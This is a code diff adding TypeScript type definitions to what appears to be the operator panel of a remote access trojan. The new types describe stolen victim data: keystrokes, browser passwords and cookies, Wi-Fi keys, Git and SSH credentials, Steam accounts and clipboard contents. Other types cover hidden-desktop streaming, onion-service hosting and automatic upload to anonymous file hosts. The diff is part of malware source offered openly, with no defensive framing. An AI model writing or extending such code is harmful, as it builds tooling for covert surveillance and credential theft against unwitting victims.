@@ -24,6 +24,8 @@ export type RATContextType = {
   ) => Promise<Window | undefined>;
   serverLogs: Array<Log>;
   getClientByAddr: (addr: string) => Promise<RATClient | undefined>;
+  autoUploadAnonFiles: boolean;
+  setAutoUploadAnonFiles: (autoUpload: boolean) => void;
 };
 
 export interface RATProviderProps {
@@ -182,6 +184,13 @@ export type AssemblyInfo = {
   assembly_file_version: string;
 };
 
+export type OnionServiceInfo = {
+  nickname: string;
+  onion_address: string;
+  port: number;
+  status?: string;
+};
+
 export type WindowWrapperProps = {
   feature_cleanup: (params: Record<string, string | undefined>) => void;
 };
@@ -211,6 +220,11 @@ export interface RemoteDesktopFramePayload {
   data: string;
 }
 
+export interface HVNCFramePayload {
+  addr: string;
+  data: string;
+}
+
 export enum TrollCommandType {
   HideDesktop = "HideDesktop",
   ShowDesktop = "ShowDesktop",
@@ -237,3 +251,184 @@ export type TrollCommand = {
   type: TrollCommandType;
   payload?: any;
 };
+
+export interface KeyloggerUpdatePayload {
+  addr: string;
+  window: string;
+  data: string;
+}
+
+export interface KeyloggerOfflineLogsPayload {
+  addr: string;
+  logs: string[];
+}
+
+export interface PasswordEntry {
+  url: string;
+  username: string;
+  password: string;
+}
+
+export interface CookieEntry {
+  domain: string;
+  name: string;
+  value: string;
+  path: string;
+  expires: string;
+}
+
+export interface HistoryEntry {
+  url: string;
+  title: string;
+  visit_count: number;
+  last_visit: string;
+}
+
+export interface BookmarkEntry {
+  url: string;
+  title: string;
+}
+
+export interface BrowserResult {
+  name: string;
+  passwords: PasswordEntry[];
+  cookies: CookieEntry[];
+  history: HistoryEntry[];
+  bookmarks: BookmarkEntry[];
+}
+
+export interface BrowserDataPayload {
+  addr: string;
+  data: {
+    browsers: BrowserResult[];
+  };
+}
+
+export interface WifiProfile {
+  ssid: string;
+  password: string;
+  authentication: string;
+  cipher: string;
+}
+
+export interface WifiDataPayload {
+  addr: string;
+  data: {
+    profiles: WifiProfile[];
+  };
+}
+
+export interface SoftwareEntry {
+  name: string;
+  version: string;
+  publisher: string;
+  install_location: string;
+  uninstall_command: string;
+  executable_path: string;
+  icon_base64: string;
+}
+
+export interface SoftwareInventoryPayload {
+  addr: string;
+  data: {
+    applications: SoftwareEntry[];
+  };
+}
+
+export interface GitCredentialEntry {
+  source: string;
+  path: string;
+  url: string;
+  username: string;
+  password: string;
+  raw: string;
+}
+
+export interface ExtractedFile {
+  path: string;
+  contents: string;
+}
+
+export interface GitDataPayload {
+  addr: string;
+  data: {
+    credentials: GitCredentialEntry[];
+    configs: ExtractedFile[];
+  };
+}
+
+export interface SSHDataPayload {
+  addr: string;
+  data: {
+    files: ExtractedFile[];
+  };
+}
+
+export interface SteamAccountEntry {
+  steam_id: string;
+  account_name: string;
+  persona_name: string;
+  remember_password: string;
+  last_logon: string;
+  details: string;
+}
+
+export interface SteamDataPayload {
+  addr: string;
+  data: {
+    accounts: SteamAccountEntry[];
+    files: ExtractedFile[];
+  };
+}
+
+export interface ClipboardUpdatePayload {
+  addr: string;
+  data: {
+    text: string;
+  };
+}
+
+export interface ClipboardImageUpdatePayload {
+  addr: string;
+  data: {
+    image_base64: string;
+    width: number;
+    height: number;
+  };
+}
+
+export interface ClipboardEvent {
+  type: "text" | "image";
+  text?: string;
+  image_base64?: string;
+  width?: number;
+  height?: number;
+  timestamp: string;
+}
+
+export interface NotificationEventPayload {
+  addr: string;
+  data: {
+    source: string;
+    title: string;
+    message: string;
+    timestamp: string;
+  };
+}
+
+export interface SoftwareIconResultPayload {
+  addr: string;
+  data: {
+    name: string;
+    icon_base64: string;
+  };
+}
+
+export interface SoftwareActionResultPayload {
+  addr: string;
+  data: {
+    name: string;
+    success: boolean;
+    message: string;
+  };
+}
